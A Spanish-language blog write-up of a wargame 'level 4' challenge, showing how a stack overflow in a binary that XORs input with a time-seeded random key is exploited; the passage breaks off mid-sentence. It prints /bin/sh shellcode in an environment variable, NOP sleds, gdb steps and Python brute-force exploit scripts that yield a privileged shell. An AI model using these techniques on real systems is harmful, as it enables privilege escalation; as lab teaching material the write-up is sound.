href="http://4.bp.blogspot.com/-FMROPDIhx8I/Vo3fkVW8MII/AAAAAAAAA0Q/T1HUTMrFbsw/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B00%253A45%253A34.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="278" src="http://4.bp.blogspot.com/-FMROPDIhx8I/Vo3fkVW8MII/AAAAAAAAA0Q/T1HUTMrFbsw/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B00%253A45%253A34.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Para poder ingresar al reto previamente hay que resolver el <b>level 3</b>, en ningún post voy a dejar los flags ya que estas entradas buscan ayudar a los participantes que se han quedado trabados o quieren aprender y mejorar sus habilidades en el desarrollo de Exploits.</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><div style="text-align: center;"><span style="color: red;"><b>Solo escribiré entradas respecto a los retos que me han resultado difíciles de resolver y creo interesante compartir debido a su dificultad de resolución.</b></span></div><br />Una vez ingresamos por ssh al servidor debemos dirigirnos hacia la carpeta <b>/levels/ </b>en ella nos encontramos con los binarios a explotar y su respectivo código fuente:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-VG-vWel4r5U/Vo3g3upIZFI/AAAAAAAAA0Y/U9YyA5e6dyI/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B00%253A51%253A42.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="196" src="http://2.bp.blogspot.com/-VG-vWel4r5U/Vo3g3upIZFI/AAAAAAAAA0Y/U9YyA5e6dyI/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B00%253A51%253A42.png" width="640" /></a></div><div style="text-align: center;"><br /></div><br />Antes de leer el código realizamos una primera ejecución del binario enviando como argumento el texto <b>TEST</b>:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-k506pdng1M8/Vo3iBZ3DWKI/AAAAAAAAA0g/dkgHyzf0iuA/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B00%253A56%253A37.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="45" src="http://1.bp.blogspot.com/-k506pdng1M8/Vo3iBZ3DWKI/AAAAAAAAA0g/dkgHyzf0iuA/s400/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B00%253A56%253A37.png" width="400" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Podemos observar que la salida no se parece en nada a nuestro parámetro por lo que revisaremos un poco el código fuente para ver que hace el binario:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-OjFoux7BToY/Vo3jVpu3u1I/AAAAAAAAA0o/GReWbBcWOPk/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B01%253A02%253A11.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="640" src="http://1.bp.blogspot.com/-OjFoux7BToY/Vo3jVpu3u1I/AAAAAAAAA0o/GReWbBcWOPk/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B01%253A02%253A11.png" width="443" /></a></div><div style="text-align: center;"><br /></div></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Al leerlo podemos observar que nuestro parámetro es tratado por la función <b>parse_buffer() </b>antes de ser mostrado en pantalla.<br /><br /><b>parse_buffer</b>:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-WMjTl3LHA-8/Vo3kM37ERQI/AAAAAAAAA0w/bPHT-ygQ_Uo/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B01%253A05%253A43.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="148" src="http://4.bp.blogspot.com/-WMjTl3LHA-8/Vo3kM37ERQI/AAAAAAAAA0w/bPHT-ygQ_Uo/s400/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B01%253A05%253A43.png" width="400" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Esta función genera un <b>key </b>aleatorio <b>(unsigned char) </b>que va desde 0 a 255, luego recorre cada carácter del buffer y le realiza la operación XOR con el <b>key </b>generado.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">para más información ver:<br /><a href="http://stackoverflow.com/questions/75191/what-is-an-unsigned-char">http://stackoverflow.com/questions/75191/what-is-an-unsigned-char</a>.</div><div><a href="http://www.taringa.net/posts/hazlo-tu-mismo/15576788/Implementar-XOR-a-la-hora-cifrar.html">http://www.taringa.net/posts/hazlo-tu-mismo/15576788/Implementar-XOR-a-la-hora-cifrar.html</a><br /><br />Este proceso es conocido como un algoritmo de cifrado simétrico, lo que quiere decir que si repetimos el mismo procedimiento sobre el buffer cifrado, este volverá a su estado original (se descifraría).<br /><br />Bajo este concepto. si&nbsp;conociésemos el valor del key, podríamos manejar la información almacenada en el buffer.<br /><br />Al tratarse de un cifrado simétrico, si nosotros previamente cifráramos con el mismo key nuestro argumento, la función <b>parse_buffer </b>realmente trabajaría descifrando el buffer.<br /><br />Para poder realizar este proceso sin tener que lidiar con la función <b>rand() </b>del binario, forzaremos el key a un numero especifico y compilaremos un binario de testing.</div><div><br /></div><div style="text-align: left;"><br /></div><pre class="brush: cpp">#include &lt;stdlib.h&gt;<br />#include &lt;string.h&gt;<br />#include &lt;stdio.h&gt;<br />#include &lt;time.h&gt;<br /><br />#define BUFFER_MAX_SIZE 1024<br /><br />typedef struct __INPUT {<br />        char output[BUFFER_MAX_SIZE / 4];<br />} INPUT;<br /><br />void parse_buffer(char *buffer) {<br />    srand(time(NULL));<br />    char key = (unsigned char)(21); /* rand() fue modificado por el numero 21 */<br />   &nbsp;printf("KEY %d\n", key); /* muestro el key para asegurarme que sea correcto */<br />    int i, size = strlen(buffer);<br />    for(i = 0; i &lt; size; i++) {<br />        buffer[i] = (char)buffer[i] ^ key;<br />    }<br />}<br /><br />int main(int argc, char **argv) {<br />    INPUT input;<br />    char out[BUFFER_MAX_SIZE / 4];<br />    char in[BUFFER_MAX_SIZE];<br />    memset(out, 0, BUFFER_MAX_SIZE / 4);<br /><br />    if(argc != 2) {<br />        printf("Usage: %s buffer\n", argv[0]);<br />        exit(0);<br />    }<br /><br />    strncpy(in, argv[1], BUFFER_MAX_SIZE - 1);<br />    parse_buffer(in);<br /><br />    strncpy(out, in, BUFFER_MAX_SIZE - 1);<br />    strncpy(input.output, out, BUFFER_MAX_SIZE - 1);<br />    printf("output: %s\n", input.output);<br />    return 0;<br />}<br /></pre><br />con este simple cambio nos garantizamos que nuestro binario de testing cifre/descifre siempre con el key 21.<br /><br />Compilamos con los flags correspondientes para eliminar cualquier tipo de protección y damos los permisos necesarios.<br /><br /><b>$ gcc -m32 -fno-stack-protector -z execstack -o /tmp/level4test /tmp/level4.c</b><br /><b>chmod 777 /tmp/level4test</b><br /><br />Solo resta crear un pequeño script en python que tome un argumente le realice un cifrado XOR 21 e imprima la cadena:<br /><br /><pre class="brush: py">#/tmp/payload.py<br />#Cifrado XOR en python<br />import sys<br />if(len(sys.argv)&lt;2):<br />        print "Usage: python payload.py {string}";<br />else:<br />        payload = "";<br />        key = 21;<br />        for letter in sys.argv[1]:<br />                payload = payload + str(chr(ord(letter) ^ int(key)));<br />        print payload;<br /><br /><br /></pre>En este punto si realizamos la ejecución del binario de la siguiente forma:<br /><br /><b>/tmp/level4test $(python /tmp/payload.py TEST)</b><br /><br />Apreciamos como el output del binario realizo el descifrado del argumento "TEST" cifrado previamente por nuestro payload.py.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-O9ZSAN3Bs5A/Vo3tzTJOXmI/AAAAAAAAA1A/gl45gpb7OiE/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B01%253A46%253A52.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="89" src="http://1.bp.blogspot.com/-O9ZSAN3Bs5A/Vo3tzTJOXmI/AAAAAAAAA1A/gl45gpb7OiE/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B01%253A46%253A52.png" width="640" /></a></div><div style="text-align: center;"><br /></div>Ahora podemos proceder a intentar overflodear el ejecutable sin miedo a pisar EIP con una dirección de memoria cifrada y sin sentido para el procesador.<br /><div><br /></div><div>Leyendo el código fuente del binario podemos obtener que el largo mínimo necesario para overflodear el buffer es 256 bytes, esto lo interpretamos siendo que:<br /><br /></div><div><pre class="brush: cpp">#define BUFFER_MAX_SIZE 1024 // El tamaño máximo del buffer es 1024 bytes&nbsp;<br /> char in[BUFFER_MAX_SIZE]; //Se crea el array in con un tamaño de 1024 bytes<br /> memset(out, 0, BUFFER_MAX_SIZE / 4) //Se le asigna un espacio de 256 bytes a la variable out<br /> strncpy(in, argv[1], BUFFER_MAX_SIZE - 1); //Se copian 1023 bytes del argumento binario al array in<br /> strncpy(out, in, BUFFER_MAX_SIZE - 1); //Se copian 1023 bytes de in en out, acá se produce en buffer overflow ya que out espera un maximo de 256 bytes y recibe 1023 bytes<br /></pre><br /><div style="-webkit-text-stroke-width: 0px; color: black; font-family: 'Times New Roman'; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; margin: 0px; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px;">Procederemos a depurar con gdb el binario y enviamos como argumento de payload.py: <b>$(python -c "print 'A'*256")</b></div><br /><div><b>r $(python /tmp/payload.py $(python -c "print 'A'*256"))</b></div><div><b><br /></b></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-oUIFHAJVUkc/Vo3xATi3LjI/AAAAAAAAA1M/G65P_3taf4M/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B02%253A00%253A32.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="188" src="http://3.bp.blogspot.com/-oUIFHAJVUkc/Vo3xATi3LjI/AAAAAAAAA1M/G65P_3taf4M/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B02%253A00%253A32.png" width="640" /></a></div><div><br /></div><div class="separator" style="clear: both; text-align: center;"></div><div>Vemos como hemos logrado pisar de forma correcta EIP, pero esta vez la sobrescritura de EIP no se produce al final del binario como podemos apreciar modificando los últimos 4 bytes:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-j4VftW7tpeQ/Vo302Uap-dI/AAAAAAAAA1Y/3HN-GffwPHk/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B02%253A16%253A54.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="156" src="http://4.bp.blogspot.com/-j4VftW7tpeQ/Vo302Uap-dI/AAAAAAAAA1Y/3HN-GffwPHk/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B02%253A16%253A54.png" width="640" /></a></div><div style="text-align: center;"><br /></div>por lo que deberemos buscar exactamente donde sobrescribimos EIP, para esto dividimos 256 bytes en 3 tipos distintos de caracteres para acorralar el byte justo:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-_ao-A30tyBA/Vo31fUsM9iI/AAAAAAAAA1g/I8J0J-iaV84/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B02%253A19%253A36.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="150" src="http://1.bp.blogspot.com/-_ao-A30tyBA/Vo31fUsM9iI/AAAAAAAAA1g/I8J0J-iaV84/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B02%253A19%253A36.png" width="640" /></a></div><div style="text-align: center;"><br /></div>Podemos ver que se logra sobrescribir EIP en los primeros 84 bytes, por lo que repetimos el proceso las veces que sea necesario hasta obtener que EIP se sobrescribe luego de 12 bytes:</div><div><br /></div><div><b>r $(python /tmp/payload.py $(python -c "print 'A'*12+'B'*4+'C'*240"))</b></div><div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-qsLYae4syHs/Vo3176uXdSI/AAAAAAAAA1s/j_sNWtRhL7w/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B02%253A21%253A32.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="170" src="http://3.bp.blogspot.com/-qsLYae4syHs/Vo3176uXdSI/AAAAAAAAA1s/j_sNWtRhL7w/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B02%253A21%253A32.png" width="640" /></a></div><div style="text-align: center;"><br /></div><br />En este momento podemos controlar el flujo del programa de forma exitosa, obligando al programa a saltar hacia donde nosotros queramos.<br /><h2 style="text-align: center;"><b>El dilema: donde agrego el shellcode?</b></h2><br />Se pueden tomar 2 caminos muy distintos en este punto, podemos optar por incluir nuestro shellcode en el espacio de 240 bytes al final del buffer, o podemos incluir nuestra shellcode dentro de una variable de entorno.<br /><br />A simple vista ambas soluciones parecen optimas salvo un detalle, a veces al realizar cifrados/descifrados sobre algunos bytes como <b>\x01, \x02, \x03, etc</b> obtenemos badchars que rompen nuestro flujo de ejecución.<br /><br />Por lo que luego de varios intentos frustrados con este método me decidí a incluir el shellcode por medio de una variable de entorno y de esta forma mantenerla lejos de cualquier operación XOR en el proceso de explotación.<br /><br />Exportamos nuestra shellcode:<br /><br /><b>$ export SecuritySignal=$(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")</b><br /><b><br /></b>Volvemos a gdb y comenzamos a buscar la dirección de la variable de entorno al final de $esp<br /><br /><b>(gdb) b main</b><br /><b>(gdb) r</b><br /><b>(gdb) x/10s $esp</b><br /><br />Damos enter hasta llegar a la dirección:<br /><br /><div class="separator" style="clear: both; text-align: center;"></div><div style="text-align: center;"><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-zPtPt86Q_g8/Vo4j34jn7PI/AAAAAAAAA3g/ctynzRB-W6M/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A37%253A28.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-zPtPt86Q_g8/Vo4j34jn7PI/AAAAAAAAA3g/ctynzRB-W6M/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A37%253A28.png" /></a></div><br /></div><b><br /></b>podemos apreciar que la dirección de <b>SecuritySignal&nbsp;</b>es: <b>0xbfffff33</b><br /><b><br /></b><b>No debemos olvidar que en realidad la variable de entorno es un string por lo tanto nuestro shellcode comienza en&nbsp;0xbfffff33+(len('SecuritySignal=')) que es igual a&nbsp;0xbfffff42</b><br /><b><br /></b>Si realizamos una prueba rápida de esto, podemos ver como obtenemos shell:<br /><br /><b>r $(python /tmp/payload.py $(python -c "import struct; print 'A'*12+struct.pack('&lt;I',&nbsp;0xbfffff42)+'C'*240"))</b><br /><b><br /></b><br /><div class="separator" style="clear: both; text-align: center;"></div><div style="text-align: center;"><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-85-z58jtcS0/Vo4kbrxWePI/AAAAAAAAA3o/PZw3H4S4VfU/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A39%253A55.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="130" src="http://4.bp.blogspot.com/-85-z58jtcS0/Vo4kbrxWePI/AAAAAAAAA3o/PZw3H4S4VfU/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A39%253A55.png" width="640" /></a></div><br /></div>Este proceso funciona de la misma forma para el binario original en <b>/levels/level4 </b>solo que ademas deberemos luchar con el cifrado XOR RANDOM, y no hay que olvidar que al producir shell dentro de gdb no escalaremos privilegios por lo que hay que buscar la forma de obtener shell por medio de bash.<br /><br /><h2 style="text-align: center;">EL GRAN PROBLEMA</h2><br />La memoria funciona de una forma bastante compleja, intentare detallar algunos problemas:<br /><br />Una variable de entorno dentro de gdb tiene una determinada dirección, pero por fuera de gdb, directamente desde bash, esta dirección de memoria cambia dependiendo de diferentes factores, puede incrementar o disminuir una cantidad aleatoria de bytes, por lo general entre 100 y 500 bytes.<br /><br />Ya que esto sucede nuestra dirección de memoria:&nbsp;<b>0xbfffff42</b><b>&nbsp;</b>no nos sirve para realizar una explotación por fuera de gdb.<br /><br /><b>Como obtenemos la dirección de memoria de una variable de entorno?</b><br /><b><br /></b>Para realizar esto utilizaremos un pequeño programa en C y haremos uso de la función <b>getenv() </b>que permite desde el código obtener una variable de entorno:<br /><br /></div></div><pre class="brush: cpp">#/tmp/getenv.c<br />#include &lt;stdio.h&gt;<br />#include &lt;stdlib.h&gt;<br /><br />int main(int argc, char *argv[]) {<br /><br />if(argc &lt; 2) {<br />printf("Usage: %s &lt;environ_va&gt;\n", argv[0]);<br />exit(-1);<br />}<br /><br />char *addr_ptr;<br /><br />addr_ptr = getenv(argv[1]);<br /><br />if(addr_ptr == NULL) {<br />printf("Environmental variable %s does not exist!\n", argv[1]);<br />exit(-1);<br />}<br /><br />printf("%s is stored at address %p\n", argv[1], addr_ptr);<br />return(0);<br />}<br /><br /></pre>Compilamos el programa: <b>gcc -o /tmp/getenv /tmp/getenv.c</b><br />Ejecutamos enviando como parametro el nombre de nuestra variable de entorno:<br /><br /><div class="separator" style="clear: both; text-align: center;"></div><div style="text-align: center;"><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-hVZB6iX4V5A/Vo4k86rp-YI/AAAAAAAAA3w/Ui7rTHeRo9Q/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A42%253A11.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="53" src="http://1.bp.blogspot.com/-hVZB6iX4V5A/Vo4k86rp-YI/AAAAAAAAA3w/Ui7rTHeRo9Q/s400/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A42%253A11.png" width="400" /></a></div><br /></div><div style="text-align: left;">Esto nos indica que nuestra SHELLCODE esta <b>cerca </b>de <b>0xbfffff38</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Tristemente como suena, no hay forma de obtener la dirección exacta del comienzo de una variable de entorno, simplemente basta con retroceder una cierta cantidad de bytes de donde especulamos se encuentra nuestra variable de entorno e ir avanzando byte por byte.<br /><br />Al ser este proceso bastante tedioso decidí realizar un script que realice el trabajo bruteforceando la dirección de memoria por mi:</div><div style="text-align: left;"><br /></div><pre class="brush: py">#/tmp/wrapper.py<br />#Bruteforce SHELLCODE address by hdbreaker<br />import os<br />import struct<br /><br />def xor_enc(inside):<br /> payload = "";<br /> key = 21;<br /> for letter in inside:<br />  payload = payload + str(chr(ord(letter) ^ int(key)));<br /> return payload;<br /><br />address = 0xbffff838; #Back in memory address, original =&gt; 0xbfffff38  <br />sleed1 = 'TEST'+'\x90'*8<br />sleed2 = '\x90'*240<br /><br />while True:<br /> try:<br />  hex_add = struct.pack('&lt;I',address)<br /><br />  payload = sleed1+hex_add+sleed2<br />  arg = xor_enc(payload)<br /><br />  print str(hex(ord(hex_add[3]))) + str(hex(ord(hex_add[2]))).replace('0x','') + str(hex(ord(hex_add[1]))).replace('0x','') + str(hex(ord(hex_add[0]))).replace('0x','');<br /><br />  os.system('/tmp/level4test '+arg)<br />  address = address+0x01<br /> except:<br />  address = address+0x01<br /><br /></pre>Luego de probar varias direcciones, nuestra shell aparece y podemos ver como el script nos muestra la dirección de memoria donde encuentra la variable de entorno SecuritySignal:  <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-nTtERpfuyD8/Vo4mF8GNPpI/AAAAAAAAA34/R7ekPBJs5O0/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A46%253A51.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="358" src="http://2.bp.blogspot.com/-nTtERpfuyD8/Vo4mF8GNPpI/AAAAAAAAA34/R7ekPBJs5O0/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A46%253A51.png" width="640" /></a></div><div class="separator" style="clear: both; text-align: center;"><br /></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Podemos apreciar como el exploit va bruteforceando la dirección de memoria hasta obtener shell en:&nbsp;<b>0xbffff9a9</b></div><div style="text-align: left;"><br /></div><div style="text-align: left;">De esta forma obtenemos la dirección de memoria correcta de nuestra variable SecuritySignal, la lógica indica que utilizando esta dirección de memoria en el binario original y lidiando un rato con el cifrado XOR RANDOM, deberíamos obtener SHELL con privilegios.<br /><br />Realizaremos una prueba rápida modificando el valor de memoria del exploit a:&nbsp;<b>0xbffff9a9</b>, eliminando el incremento de la dirección de memoria,&nbsp;cambiando la ruta del ejecutable a: <b>/levels/level4 </b>y para tener un mejor control visual de la ejecución del programa agregaremos un pequeño retraso entre cada ejecución:</div><div style="text-align: left;"><div style="text-align: center;"><br /></div></div><div style="text-align: left;"><b><span style="color: red;">Nota: se agrego el string 'TEST' al comienzo de los primeros 12 bytes con el fin de poder tener una referencia visual cuando rand() tome el valor 21 (TEST se volvería legible en pantalla)</span></b></div><div style="text-align: left;"><br /></div><pre class="brush: py">import os<br />import time<br />import struct<br /><br />def xor_enc(inside):<br /> payload = "";<br /> key = 21;<br /> for letter in inside:<br />  payload = payload + str(chr(ord(letter) ^ int(key)));<br /> return payload;<br /><br />address = 0xbffff9a9; #Address of SHELLCODE enviroment variable  <br />sleed1 = 'TEST'+'\x90'*8<br />sleed2 = '\x90'*240<br /><br />while True:<br /> try:<br />  hex_add = struct.pack('&lt;I',address)<br /><br />  payload = sleed1+hex_add+sleed2<br />  arg = xor_enc(payload)<br /><br />  print str(hex(ord(hex_add[3]))) + str(hex(ord(hex_add[2]))).replace('0x','') + str(hex(ord(hex_add[1]))).replace('0x','') + str(hex(ord(hex_add[0]))).replace('0x','');<br /><br />  os.system('/levels/level4 '+arg) #Change executable file to /levels/level4<br />  time.sleep(0.75)<br /> except:<br />  pass<br /><br /></pre>Luego de un tiempo la función <b>rand() </b>toma el valor 21 y descifra correctamente nuestro payload:<br /><br /><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-TvKKLIwX1IU/Vo4mrqev36I/AAAAAAAAA4A/ZsE7yIv4dcA/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A49%253A28.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="52" src="http://2.bp.blogspot.com/-TvKKLIwX1IU/Vo4mrqev36I/AAAAAAAAA4A/ZsE7yIv4dcA/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A49%253A28.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;"><b>PERO QUE?!? </b>en este punto quede desconcertado un par de días y me puse a estudiar más sobre la gestión de memoria y la localización de las variables de entorno.<br /><br />En ese tiempo aprendí que las variables de entorno no solo cambian de dirección por fuera de gdb sino que también cambian de dirección dependiendo el path donde estemos situados, así que <b>SecuritySignal</b> se encontrará en<b> 0xbffff9a9</b> solo para los binarios que se encuentren en la carpeta <b>/tmp/ </b>pero no para los binarios en la carpeta <b>/levels/.</b></div><div style="text-align: left;"><br />Debido a esto me encontraba bastante frustrado, el proceso de bruteforcing debería funcionar pero... al tener que lidiar con el cifrado XOR RANDOM los bucles se volverían practicamente infinitos, ya que debería repetir la misma dirección de memoria hasta garantizar que el payload se descifro correctamente y si el payload no me brinda una shell,&nbsp;recién ahí volver a incrementar la dirección de memoria.<br /><br />El trabajo tardaría meses o quizás años, &nbsp;así que me estanque en este punto y decidí tomarme un día más para pensar en posibles soluciones.<br /><br />Pasado el día lejos del reto decidí retomar con la mente fresca, y al poco tiempo de intentar superar el reto se me ocurrió lo siguiente:<br /><br />Si, <b>getenv </b>me da una dirección de memoria, no exacta, pero próxima a - 250 o + 250 bytes podría rellenar ese espacio con <b>NOPS (nopsleed)&nbsp;</b>esperando que la dirección que me devuelve <b>getenv </b>se escriba con <b>NOP</b>, de esta forma el flujo de ejecución continuaria hasta llegar al shellcode alojado al final de la variable de entorno.<br /><br />Mejor explicado:<br /><br /><b>$/tmp/getenv</b>&nbsp;<b>SecuritySignal</b>&nbsp; me comunica que la variable de entorno se encuentra próxima a: <b>0xbffffd42</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Esto quiere decir que el punto de inició de mi shellcode podría encontrarse entre&nbsp;<b>0xbffffc48</b>&nbsp;y&nbsp;<b>0xbffffe3c (+- 250 bytes desde&nbsp;</b><b>0xbffffd44</b><b>)</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Si yo pudiera llenar ese espacio de posibilidades con <b>NOPS (\x90)</b>, al forzar el salto hacia:&nbsp;<b>0xbffffd42</b><b>&nbsp;</b>este y las posteriores posibilidades tendrían el valor <b>NOP </b>por lo que el flujo de ejecución se vería forzado a continuar por una cola de <b>NOPS </b>hasta llegar a la shellcode alojada al final de la cola.<br /><br />De esta forma eliminaría totalmente la posibilidad de corromper la ejecución y forzosamente debería obtener shell:<br /><br />Para esto modifique mi variable de entorno de la siguiente forma:</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><b>$ export SecuritySignal=$(python -c "print '\x90'*500+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">obtuve la dirección de memoria con <b>/tmp/getenv SecuritySignal (</b><b>0xbffffd44</b><b>)&nbsp;</b>y la agregué en mi expoit:</div><div style="text-align: center;"><b><br /></b></div><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-bwvdl2wwBZc/Vo4ncF1dYsI/AAAAAAAAA4I/cMcA7uZfR-4/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A52%253A51.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="210" src="http://3.bp.blogspot.com/-bwvdl2wwBZc/Vo4ncF1dYsI/AAAAAAAAA4I/cMcA7uZfR-4/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B05%253A52%253A51.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">En este punto la ansiedad me estaba matando, así que cruce los dedos y largue el ataque:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-duIsV0P4A-s/Vo4phL5QMKI/AAAAAAAAA4U/Z7qNvsVRoE4/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B06%253A01%253A28.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="74" src="http://2.bp.blogspot.com/-duIsV0P4A-s/Vo4phL5QMKI/AAAAAAAAA4U/Z7qNvsVRoE4/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-01-07%2B06%253A01%253A28.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">y por fin y luego de mucho esfuerzo y de todo el tiempo necesario para que rand() se dignara a darnos key 21, hemos logrado obtener shell con permisos de level5! Solo resta leer el flag :)</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><b>TIPS:</b></div><div style="text-align: left;"><br /></div><div style="text-align: left;">La memoria muchas veces nos juega malas pasadas, algunas recomendaciones de mi parte:&nbsp;</div><div style="text-align: left;"><br /></div><div style="text-align: left;">1) Utilicen nombres de variables de entorno simil a las existentes.</div><div style="text-align: left;">2) Si su exploit no funciona prueben cambiando el nombre de la variable de entorno y obteniendo nuevamente la dirección de memoria</div><div style="text-align: left;">3) Prueben distintos largos de nopsleed previo shellcode<br /><br /><br /><b>Actualización 09/01/2016:</b><br /><b><br /></b>Revisando el código fuente del binario a explotar, y profundizando en la importación de librerías C en python, pude llegar a una solución optima:<br /><br /></div><pre class="brush: py">void parse_buffer(char *buffer) {<br />    <span style="color: red;">srand(time(NULL));<br />    char key = (unsigned char)(rand());</span><br />    int i, size = strlen(buffer);<br />    for(i = 0; i &lt; size; i++) {<br />        buffer[i] = (char)buffer[i] ^ key;<br />    }<br />}<br /><br /></pre><div style="text-align: left;">Si observamos las 2 primeras lineas de esta función, podemos ver que la función srand(), responsable de la creación de la semilla para la generación de números aleatorios, utiliza como parámetro la función time(NULL);<br /><br />Time(NULL) retorna la hora actual del sistema en segundos, la cual es tomada como parámetro de la semilla para luego con el uso de&nbsp;rand(); generar un numero aleatorio.<br /><br />Ya que estamos tratando con un <b>unsigned char</b>&nbsp;el número aleatorio se vera limitado entre los valores&nbsp;0 y 255, o lo que es igual a 256 combinaciones posibles.<br /><br />Una vez obtenido este numero se utiliza como key de cifrado del buffer.<br /><br /><b>Conclusión:</b><br /><br />Si en nuestro exploit logramos obtener el tiempo exacto en segundos del sistema, generar la semilla, el key de cifrado, cifrar el payload y ejecutar el binario a explotar antes de que pase un segundo, garantizaremos que el numero KEY RANDOM generado por el binario sera el mismo el cual generamos desde nuestro exploit ya que ambos utilizaran como semilla el mismo tiempo del sistema.<br /><br />Esto se debe a que la funcion 